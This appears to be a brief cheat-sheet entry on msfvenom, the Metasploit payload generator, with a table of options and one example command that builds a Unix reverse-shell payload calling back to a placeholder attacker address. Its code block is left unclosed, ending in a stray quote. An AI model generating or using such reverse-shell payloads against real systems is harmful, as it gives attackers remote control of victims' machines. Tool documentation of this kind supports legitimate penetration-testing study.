# MsfVenom - A Metasploit standalone payload generator and Encoder

**MsfVenom** is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Msfvenom has replaced both msfpayload and msfencode.

## Example use
```bash
msfvenom -p cmd/unix/reverse_shell LHOST=w.z.y.z LPORT=port_number R"
## Options/Switches
|Option|Meaning|
|---|---|
|`-p` or `--payload`|Payload to use, Specify a `-` or `stdin` to use custom payloads.
|lhost|Local host IP address (this is **our** machine's IP address)|
|lport|The port to listen on (this is **our** machine's PORT)|
|R|Export the payload in raw format|

